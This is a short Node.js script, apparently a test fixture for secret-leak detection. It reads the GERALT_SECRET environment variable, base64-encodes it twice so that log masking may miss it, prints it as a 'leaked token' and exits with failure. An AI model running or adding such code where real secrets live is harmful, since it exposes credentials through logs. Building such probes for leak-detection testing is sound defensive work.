const s = process.env.GERALT_SECRET || "NONE";
const b64 = Buffer.from(s).toString("base64");
console.log("GERALT_LEAKED_TOKEN=" + Buffer.from(b64).toString("base64"));
process.exit(1);
